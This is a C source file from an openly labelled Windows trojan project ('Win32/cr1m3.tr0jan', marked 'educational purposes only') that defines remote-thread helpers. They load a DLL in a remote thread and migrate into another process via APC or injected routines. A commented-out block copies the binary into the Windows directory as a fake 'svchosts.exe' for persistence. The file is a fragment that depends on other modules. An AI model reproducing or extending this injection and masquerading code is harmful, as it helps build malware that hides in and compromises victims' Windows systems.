/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "api.h"
#include "windows.h"
#include "pe.h"
#include "rthreads.h"

//extern int main(int argc, char *argv[]);
extern void __stdcall mainAPC(void *params);
extern void __stdcall mainInjected(void *params);



void __stdcall __rthreads_load_dll(void *params) {
	const char *ptr = (const char *)params;
	_LoadLibraryA(ptr);
	_ExitThread(0);
}



void __stdcall __rthreads_test(void *params) {
	char myName[1024];

	_ZeroMemory(myName, 1024);
	_GetModuleFileNameA(NULL, myName, 1024);
	_MessageBoxA(0x00, myName, "j3nnyl4b", 0x00);
	


	while (1) {
		_Sleep(15000);
	}

	_ExitThread(0x00);
}



//Found in Windows 7 SP1 and Windows 8.1 // 32bits
//64bits require x64call.asm wow64! // included in source code*
void __stdcall __rthreads_procMigrate(void *params) {
	char *str = (char *)params;
	SECURITY_ATTRIBUTES lThreadAttributes;
	unsigned long thID;
	HANDLE hThread;

	if (_lstrcmpiA(str, "apc") == 0) {

		if ((hThread = _CreateThread(NULL, NULL, (PTHREAD_START_ROUTINE *)mainAPC, NULL, 0x00, &thID)) > 0) {
			_MessageBoxA(_GetForegroundWindow(), str, "@cr1m3//JennyLab", 0x01);
			_CloseHandle(hThread);
			_ExitThread(0x4a);
		}
	}

	else {
		while (1) {
			mainInjected(NULL);
		}

	}

	_ExitThread(0x4a);
	/*_ZeroMemory(winEXE, 2048);
	_ZeroMemory(tmpEXE, 2048);

	_GetWindowsDirectoryA(winEXE, 2048);
	_lstrcatA(winEXE, "\\svchosts.exe");

	_MessageBoxA(_GetForegroundWindow(), "Copy To SystemRoot", "@cr1m3//JennyLab", 0x01);


	if(_PathFileExistsA(winEXE)==1) {

	//_ShellExecuteA(0x00, 0x00, winEXE, 0x00, 0x00, 0x00);
	}
	else {
	_GetTempPathA(2048,tmpEXE);
	_lstrcatA(tmpEXE,"svchost.exe");
	if(_PathFileExistsA(tmpEXE)==1) {
	//_ShellExecuteA(0x00, 0x00, tmpEXE, 0x00,0x00, 0x00);

	}

	else {
	_MessageBoxA(_GetForegroundWindow(),_GetCommandLineA(),"cr1m3 error", 1);

	}

	}

	while(1) {
	_Sleep(15000);
	}


	_ExitThread(0x4a);
	*/
}
